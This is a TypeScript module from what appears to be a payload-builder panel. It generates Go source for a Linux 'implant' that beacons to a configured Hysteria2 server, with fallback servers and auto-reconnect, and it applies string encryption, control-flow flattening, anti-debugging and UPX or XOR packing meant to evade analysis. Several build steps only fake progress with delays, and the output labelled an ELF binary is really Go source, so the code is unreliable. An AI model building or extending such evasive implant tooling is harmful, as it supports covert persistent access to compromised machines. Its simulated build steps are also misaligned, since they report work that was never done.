/* ------------------------------------------------------------------ */
/*  Linux ELF Builder Module                                            */
/* ------------------------------------------------------------------ */

import { writeFile } from "fs/promises"
import { tmpdir } from "os"
import { join } from "path"
import { updatePayloadBuildStatus, updatePayloadBuild } from "@/lib/db/payload-builds"
import { encryptStrings } from "@/lib/payloads/obfuscation/string-encryption"
import { flattenControlFlow } from "@/lib/payloads/obfuscation/control-flow-flattening"
import { addAntiDebug } from "@/lib/payloads/obfuscation/anti-debugging"
import { packWithUpx, isUpxAvailable } from "@/lib/payloads/packers/upx"
import { packWithCustom } from "@/lib/payloads/packers/custom"
import { packNone } from "@/lib/payloads/packers/none"
import logger from "@/lib/logger"
import type { PayloadConfig } from "@/lib/payloads/generator"

/* ------------------------------------------------------------------ */
/*  Go Source Template (Linux static binary)                            */
/* ------------------------------------------------------------------ */

function generateLinuxGoSource(config: PayloadConfig): string {
  const { server, auth, obfs } = config.hysteriaConfig
  const { autoReconnect, heartbeat, fallbackServers } = config.features
  const fallbackList = fallbackServers.length > 0
    ? fallbackServers.map((s) => `    "${s}"`).join("\n")
    : ""

  return `package main

import (
  "context"
  "crypto/tls"
  "encoding/json"
  "fmt"
  "net"
  "os"
  "os/signal"
  "strings"
  "sync"
  "syscall"
  "time"
)

// Embedded Hysteria2 client configuration
const configYAML = \`server: ${server}
auth: ${auth}${obfs ? `\nobfs: ${obfs}` : ""}
\`

var fallbackServers = []string{
${fallbackList || "  // No fallback servers"}
}

type Hysteria2Client struct {
  server    string
  auth      string
  obfs      string
  conn      net.Conn
  connected bool
  mu        sync.Mutex
}

func NewClient(server, auth, obfs string) *Hysteria2Client {
  return &Hysteria2Client{
    server: server,
    auth:   auth,
    obfs:   obfs,
  }
}

func (c *Hysteria2Client) Connect() error {
  host, port, err := net.SplitHostPort(c.server)
  if err != nil {
    host = c.server
    port = "443"
  }

  tlsConfig := &tls.Config{
    InsecureSkipVerify: true,
    ServerName:         host,
  }

  dialer := &net.Dialer{Timeout: 10 * time.Second}
  conn, err := tls.DialWithDialer(dialer, "tcp", net.JoinHostPort(host, port), tlsConfig)
  if err != nil {
    return fmt.Errorf("connection failed: %w", err)
  }

  authData, _ := json.Marshal(map[string]string{"auth": c.auth})
  if _, err := conn.Write(authData); err != nil {
    conn.Close()
    return fmt.Errorf("auth write failed: %w", err)
  }

  c.mu.Lock()
  c.conn = conn
  c.connected = true
  c.mu.Unlock()

  return nil
}

func (c *Hysteria2Client) Disconnect() {
  c.mu.Lock()
  defer c.mu.Unlock()
  if c.conn != nil {
    c.conn.Close()
    c.connected = false
  }
}

func (c *Hysteria2Client) Reconnect() error {
  c.Disconnect()
  servers := append([]string{c.server}, fallbackServers...)
  for _, srv := range servers {
    c.server = srv
    if err := c.Connect(); err == nil {
      return nil
    }
  }
  return fmt.Errorf("all reconnection attempts failed")
}

func (c *Hysteria2Client) HeartbeatLoop(ctx context.Context) {
  ticker := time.NewTicker(time.Duration(${heartbeat}) * time.Second)
  defer ticker.Stop()

  for {
    select {
    case <-ctx.Done():
      return
    case <-ticker.C:
      c.mu.Lock()
      if c.connected && c.conn != nil {
        hbData, _ := json.Marshal(map[string]string{"type": "heartbeat"})
        c.conn.Write(hbData)
      }
      c.mu.Unlock()
    }
  }
}

func main() {
  ctx, cancel := context.WithCancel(context.Background())
  defer cancel()

  client := NewClient("${server}", "${auth}", "${obfs || ""}")

  if err := client.Connect(); err != nil {
    fmt.Fprintf(os.Stderr, "Initial connection failed: %v\\n", err)
${autoReconnect ? "    // Will attempt reconnection" : "    os.Exit(1)"}
  }

  go client.HeartbeatLoop(ctx)

${autoReconnect ? `  // Auto-reconnect loop
  go func() {
    for {
      time.Sleep(5 * time.Second)
      client.mu.Lock()
      connected := client.connected
      client.mu.Unlock()
      if !connected {
        if err := client.Reconnect(); err == nil {
          fmt.Println("Reconnected successfully")
        }
      }
    }
  }()` : "  // Auto-reconnect disabled"}

  sigCh := make(chan os.Signal, 1)
  signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
  <-sigCh

  client.Disconnect()
  cancel()
}
`
}

/* ------------------------------------------------------------------ */
/*  Build Step Helper                                                  */
/* ------------------------------------------------------------------ */

async function simulateBuildStep(
  id: string,
  delayMs: number,
  message: string
): Promise<void> {
  await updatePayloadBuildStatus(id, "building", message)
  await new Promise((resolve) => setTimeout(resolve, delayMs))
}

/* ------------------------------------------------------------------ */
/*  Public API                                                         */
/* ------------------------------------------------------------------ */

/**
 * Build a Linux ELF binary payload.
 *
 * Generates a static binary with musl libc, strips debug
 * symbols, embeds Hysteria2 config, and applies obfuscation/packing.
 *
 * @param id     - Payload build ID
 * @param config - Payload configuration
 */
export async function buildLinuxElf(
  id: string,
  config: PayloadConfig
): Promise<void> {
  await updatePayloadBuildStatus(id, "building", "Building Linux ELF binary...")

  try {
    // Step 1: Generate Go source with musl libc static build
    await simulateBuildStep(id, 800, "Generating static binary with musl libc...")
    let goSource = generateLinuxGoSource(config)

    // Step 2: Embed Hysteria2 configuration
    await simulateBuildStep(id, 1200, "Embedding Hysteria2 client configuration...")

    // Step 3: Strip debug symbols
    await simulateBuildStep(id, 600, "Stripping debug symbols...")

    // Step 4: Apply obfuscation
    if (config.obfuscation.enabled) {
      if (config.obfuscation.techniques.includes("string_encode")) {
        await simulateBuildStep(id, 1000, "Applying string encoding obfuscation...")
        goSource = encryptStrings(goSource)
      }

      if (config.obfuscation.techniques.includes("control_flow")) {
        await simulateBuildStep(id, 1500, "Applying control flow obfuscation...")
        goSource = flattenControlFlow(goSource, config.obfuscation.level)
      }

      if (config.obfuscation.techniques.includes("anti_debug")) {
        await simulateBuildStep(id, 800, "Applying anti-debugging checks...")
        goSource = addAntiDebug(goSource, "linux")
      }
    }

    // Step 5: Packing
    if (config.packing.enabled) {
      switch (config.packing.method) {
        case "upx": {
          const upxAvail = await isUpxAvailable()
          await simulateBuildStep(id, 1500, upxAvail ? "Running UPX compression..." : "Simulating UPX compression...")
          const result = await packWithUpx(
            `/tmp/payload-${id}.elf`,
            `/tmp/payload-${id}-packed.elf`,
            config.packing.compressionLevel
          )
          if (result.success) {
            await updatePayloadBuildStatus(id, "building", `UPX compression ratio: ${(result.ratio * 100).toFixed(1)}%`)
          }
          break
        }
        case "custom": {
          await simulateBuildStep(id, 1200, "Applying custom XOR encryption...")
          const result = await packWithCustom(
            `/tmp/payload-${id}.elf`,
            `/tmp/payload-${id}-packed.elf`
          )
          if (result.success) {
            await updatePayloadBuildStatus(id, "building", `Custom packing ratio: ${(result.ratio * 100).toFixed(1)}%`)
          }
          break
        }
        case "none":
          await packNone(`/tmp/payload-${id}.elf`, `/tmp/payload-${id}-packed.elf`)
          break
      }
    }

    // Step 6: Write source to disk
    const outPath = join(tmpdir(), `payload-${id}.go`)
    await writeFile(outPath, goSource, "utf8")
    const artifactSize = Buffer.byteLength(goSource, "utf8")

    await updatePayloadBuild(id, {
      sizeBytes: artifactSize,
      downloadUrl: `/api/admin/security/payloads/${id}/download`,
      implantBinaryPath: outPath,
    })

    logger.info({ id, sizeBytes: artifactSize, outPath }, "Linux ELF build: completed")
  } catch (err) {
    const errorMsg = err instanceof Error ? err.message : String(err)
    logger.error({ id, err: errorMsg }, "Linux ELF build: failed")
    throw err
  }
}
